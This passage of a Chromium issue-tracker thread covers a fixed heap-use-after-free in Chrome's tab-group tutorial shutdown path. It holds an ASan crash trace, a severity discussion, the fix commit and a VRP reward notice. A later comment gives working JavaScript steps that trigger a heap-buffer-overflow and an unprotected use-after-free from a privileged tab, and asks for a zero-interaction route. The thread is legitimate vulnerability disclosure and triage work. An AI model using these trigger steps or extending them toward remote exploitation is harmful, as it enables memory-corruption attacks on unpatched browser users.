    #12 0x7ffbdd22b74e in views::Widget::~Widget C:\b\s\w\ir\cache\builder\src\ui\views\widget\widget.cc:246
    #13 0x7ffbe4ed037f in BrowserFrame::~BrowserFrame C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\views\frame\browser_frame.cc:128
    #14 0x7ffbe97aad59 in views::DesktopNativeWidgetAura::~DesktopNativeWidgetAura C:\b\s\w\ir\cache\builder\src\ui\views\widget\desktop_aura\desktop_native_widget_aura.cc:318
    #15 0x7ffbf0c8fc3f in DesktopBrowserFrameAura::~DesktopBrowserFrameAura C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\views\frame\desktop_browser_frame_aura.cc:39
    #16 0x7ffbe97ac08b in views::DesktopNativeWidgetAura::OnHostClosed C:\b\s\w\ir\cache\builder\src\ui\views\widget\desktop_aura\desktop_native_widget_aura.cc:393
    #17 0x7ffbe978150e in views::HWNDMessageHandler::OnWndProc C:\b\s\w\ir\cache\builder\src\ui\views\win\hwnd_message_handler.cc:1103
    #18 0x7ffbe1e6385c in gfx::WindowImpl::WndProc C:\b\s\w\ir\cache\builder\src\ui\gfx\win\window_impl.cc:310
    #19 0x7ffbe1e6249e in base::win::WrappedWindowProc<&gfx::WindowImpl::WndProc> C:\b\s\w\ir\cache\builder\src\base\win\wrapped_window_proc.h:74
    #20 0x7ffc550fef74 in CallWindowProcW+0x614 (C:\Windows\System32\USER32.dll+0x18000ef74)
    #21 0x7ffc550fe8db in DispatchMessageW+0x6eb (C:\Windows\System32\USER32.dll+0x18000e8db)
    #22 0x7ffc551176e7 in GetLastInputInfo+0x77 (C:\Windows\System32\USER32.dll+0x1800276e7)
    #23 0x7ffc55f10e63 in KiUserCallbackDispatcher+0x23 (C:\Windows\SYSTEM32\ntdll.dll+0x1800a0e63)
    #24 0x7ffc53d02383 in NtUserDestroyWindow+0x13 (C:\Windows\System32\win32u.dll+0x180002383)
    #25 0x7ffbe979c9c1 in base::internal::Invoker<base::internal::FunctorTraits<void (views::HWNDMessageHandler::*&&)(),base::WeakPtr<views::HWNDMessageHandler> &&>,base::internal::BindState<1,1,0,void (views::HWNDMessageHandler::*)(),base::WeakPtr<views::HWNDMessageHandler> >,void ()>::RunOnce C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:980
    #26 0x7ffbdd692340 in base::TaskAnnotator::RunTaskImpl C:\b\s\w\ir\cache\builder\src\base\task\common\task_annotator.cc:203
    #27 0x7ffbe1090cfe in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl C:\b\s\w\ir\cache\builder\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:473

previously allocated by thread T0 here:
    #0 0x7ff7442bcb0d in malloc C:\b\s\w\ir\cache\builder\src\third_party\llvm\compiler-rt\lib\asan\asan_malloc_win.cpp:98
    #1 0x7ffbf3eeb16e in operator new D:\a\_work\1\s\src\vctools\crt\vcstartup\src\heap\new_scalar.cpp:36
    #2 0x7ffbe06ce721 in Browser::Create C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\browser.cc:510
    #3 0x7ffbe98cb3a2 in StartupBrowserCreatorImpl::OpenTabsInBrowser C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\startup\startup_browser_creator_impl.cc:245
    #4 0x7ffbe98ce02e in StartupBrowserCreatorImpl::RestoreOrCreateBrowser C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\startup\startup_browser_creator_impl.cc:627
    #5 0x7ffbe98ca4ff in StartupBrowserCreatorImpl::DetermineURLsAndLaunch C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\startup\startup_browser_creator_impl.cc:442
    #6 0x7ffbe98c9612 in StartupBrowserCreatorImpl::Launch C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\startup\startup_browser_creator_impl.cc:174
    #7 0x7ffbe4823198 in StartupBrowserCreator::LaunchBrowser C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\startup\startup_browser_creator.cc:721
    #8 0x7ffbe4824469 in StartupBrowserCreator::LaunchBrowserForLastProfiles C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\startup\startup_browser_creator.cc:802
    #9 0x7ffbe48228ac in StartupBrowserCreator::ProcessCmdLineImpl C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\startup\startup_browser_creator.cc:1319
    #10 0x7ffbe482063a in StartupBrowserCreator::Start C:\b\s\w\ir\cache\builder\src\chrome\browser\ui\startup\startup_browser_creator.cc:672
    #11 0x7ffbe0bdbb93 in ChromeBrowserMainParts::PreMainMessageLoopRunImpl C:\b\s\w\ir\cache\builder\src\chrome\browser\chrome_browser_main.cc:1787
    #12 0x7ffbe0bdaac3 in ChromeBrowserMainParts::PreMainMessageLoopRun C:\b\s\w\ir\cache\builder\src\chrome\browser\chrome_browser_main.cc:1234
    #13 0x7ffbd6f63008 in content::BrowserMainLoop::PreMainMessageLoopRun C:\b\s\w\ir\cache\builder\src\content\browser\browser_main_loop.cc:1012
    #14 0x7ffbd6f6a3a8 in base::internal::Invoker<base::internal::FunctorTraits<int (content::BrowserMainLoop::*&&)(),content::BrowserMainLoop *>,base::internal::BindState<1,1,0,int (content::BrowserMainLoop::*)(),base::internal::UnretainedWrapper<content::BrowserMainLoop,base::unretained_traits::MayNotDangle,0> >,int ()>::RunOnce C:\b\s\w\ir\cache\builder\src\base\functional\bind_internal.h:980
    #15 0x7ffbd8515648 in content::StartupTaskRunner::RunAllTasksNow C:\b\s\w\ir\cache\builder\src\content\browser\startup_task_runner.cc:42
    #16 0x7ffbd6f61f5d in content::BrowserMainLoop::CreateStartupTasks C:\b\s\w\ir\cache\builder\src\content\browser\browser_main_loop.cc:915
    #17 0x7ffbd6f6ca05 in content::BrowserMainRunnerImpl::Initialize C:\b\s\w\ir\cache\builder\src\content\browser\browser_main_runner_impl.cc:140
    #18 0x7ffbd6f5c8dc in content::BrowserMain C:\b\s\w\ir\cache\builder\src\content\browser\browser_main.cc:30
    #19 0x7ffbdbf7b47e in content::RunBrowserProcessMain C:\b\s\w\ir\cache\builder\src\content\app\content_main_runner_impl.cc:717
    #20 0x7ffbdbf7e5bf in content::ContentMainRunnerImpl::RunBrowser C:\b\s\w\ir\cache\builder\src\content\app\content_main_runner_impl.cc:1309
    #21 0x7ffbdbf7de67 in content::ContentMainRunnerImpl::Run C:\b\s\w\ir\cache\builder\src\content\app\content_main_runner_impl.cc:1154
    #22 0x7ffbdbf7984d in content::RunContentProcess C:\b\s\w\ir\cache\builder\src\content\app\content_main.cc:332
    #23 0x7ffbdbf7a33d in content::ContentMain C:\b\s\w\ir\cache\builder\src\content\app\content_main.cc:345
    #24 0x7ffbceef1601 in ChromeMain C:\b\s\w\ir\cache\builder\src\chrome\app\chrome_main.cc:192
    #25 0x7ff7441e43a5 in MainDllLoader::Launch C:\b\s\w\ir\cache\builder\src\chrome\app\main_dll_loader_win.cc:181
    #26 0x7ff7441e1db2 in main C:\b\s\w\ir\cache\builder\src\chrome\app\chrome_exe_main_win.cc:350
    #27 0x7ff7445c0583 in __scrt_common_main_seh D:\a\_work\1\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl:288

SUMMARY: AddressSanitizer: heap-use-after-free C:\b\s\w\ir\cache\builder\src\base\memory\raw_ptr_asan_hooks.cc:53 in base::internal::`anonymous namespace'::CrashImmediatelyOnUseAfterFree
Shadow bytes around the buggy address:
  0x12187fe2dc00: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x12187fe2dc80: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x12187fe2dd00: fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa
  0x12187fe2dd80: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x12187fe2de00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa f7 fa
=>0x12187fe2de80:[fd]fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x12187fe2df00: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x12187fe2df80: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x12187fe2e000: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x12187fe2e080: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x12187fe2e100: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb

==16684==ADDITIONAL INFO

==16684==Note: Please include this section with the ASan report.
Task trace:


MiraclePtr Status: PROTECTED
This crash occurred while a raw_ptr<T> object containing a dangling pointer was being dereferenced.
MiraclePtr is expected to make this crash non-exploitable once fully enabled.
Refer to https://chromium.googlesource.com/chromium/src/+/main/base/memory/raw_ptr.md for details.

==16684==END OF ADDITIONAL INFO
==16684==ABORTING

```

Severity: as this is a browser process crash, it would be S0, but:

- It's profile destruction, which bumps down severity by one level
- It's MiraclePtr protected, which does the same
- It's possibly only reachable via devtools, maybe into `chrome://` UI
  Overall I think those together mean that this is S2 at most, and that's probably on the assumption that the same flaw can be reached some other way.

OS: per [issue 340170017](https://issues.chromium.org/issues/340170017), I can't reach this bug on Linux, but perhaps that's because it's obscured by another bug. I'm going to assume that this impacts all non-Linux desktop platforms.

FoundIn: I get the same UaF on an M124 ASAN build, so labelling FoundIn-124.

### ad...@google.com (2024-05-13)

Assigning towards [estalin who seems to know about this code](https://source.chromium.org/chromium/chromium/src/+/main:chrome/browser/ui/views/user_education/browser_user_education_service.cc;drc=1cdbec921b47371a9b741436b0cb2be161799f98;l=116)

### pe...@google.com (2024-05-13)

Setting milestone because of s2 severity.

### pe...@google.com (2024-05-13)

Setting Priority to P1 to match Severity s2. If this is incorrect, please reset the priority. The automation bot account won't make this change again.

### es...@google.com (2024-05-14)

Sent out CL https://chromium-review.googlesource.com/c/chromium/src/+/5536788 to address this issue.

### ap...@google.com (2024-05-14)

Project: chromium/src
Branch: main

commit 86ebd2d6d96042a44760b74147df4b6e7a332801
Author: Eshwar Stalin <estalin@chromium.org>
Date:   Tue May 14 16:40:43 2024

    Fixing a potential use after free issue
    
    Aborting the save tab group tutorial through closing the browser window
    could result in a use after free. To address this, moving to storing a
    weak pointer for the browser object for temporary tutorial state and
    also skipping reverting the state during browser shutdown.
    
    Bug: 340098902
    Change-Id: I63d7011c633101c2eb18ab178aecf279665209dd
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5536788
    Commit-Queue: Eshwar Stalin <estalin@chromium.org>
    Reviewed-by: Dana Fried <dfried@chromium.org>
    Cr-Commit-Position: refs/heads/main@{#1300675}

M       chrome/browser/ui/views/user_education/browser_user_education_service.cc

https://chromium-review.googlesource.com/5536788


### xp...@gmail.com (2024-05-21)

Hi,

I am here to add additional ways to reproduce this issue in addition to the container-overflow. TLDR; heap-buffer-overflow and a UAF not protected by Miracle Pointer.

Reproduced on Linux and Windows (Please update the scope!).

# 1: Heap-buffer-overflow steps:

0: From any privileged tab, e.g., Chrome's new tab page, execute:

`window.open("chrome://tab-search.top-chrome/", "", "height=400,width=400");`

1: In the popup, and just like in the original steps, let's execute:

`setInterval(()=>{ document.querySelector("body > tab-search-app").apiProxy_.startTabGroupTutorial() }, 30); setTimeout(()=>{ window.close(); }, 250);`

2: Open a new window.
3: Wait around 1-2 minutes. (We can also observe a UAF if omit step 3). Eventually crashes with heap-buffer-overflow.

# 2: UAF steps (not guarded by MiraclePtr):

0: From any privileged tab, e.g., Chrome's new tab page, execute:

`window.open("chrome://tab-search.top-chrome/", "", "height=400,width=400");`

1: In the popup, and just like in the original steps, let's execute:

`setInterval(()=>{ document.querySelector("body > tab-search-app").apiProxy_.startTabGroupTutorial() }, 30); setTimeout(()=>{ window.close(); }, 250);`

2: In the main window, open the hamburger menu and click "Exit".

# Notes:

1: While doing the non-protected UAF steps, we can also observe a Heap-buffer-overflow.

2: I can confirm that Eshwar@'s fixes do prevent both the HBO and UAF from occurring *in this instance*.

Like [ad...@google.com](mailto:ad...@google.com) said, this is due to a much larger issue in the views component and its view hierarchy. I am currently investigating if this is possible through a zero-interaction webpage (or one click). If anyone has any idea how this could possibly be done, I'd appreciate that. I think it's possible :)

Thanks!

### sp...@google.com (2024-06-21)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $2000.00 for this report.

Rationale for this decision:
highly mitigated memory corruption in a non-sandboxed process; not remote exploitable and requiring direct user interaction/ access to devtools, BRP-protected 


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
Please contact security-vrp@chromium.org with any questions.

### am...@chromium.org (2024-06-21)

Congrats on another on another one, Sven! Thank you for your efforts and reporting this issue to us!

### xp...@gmail.com (2024-06-22)

Thank you for the reward.

### pe...@google.com (2024-08-21)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/340098902)*
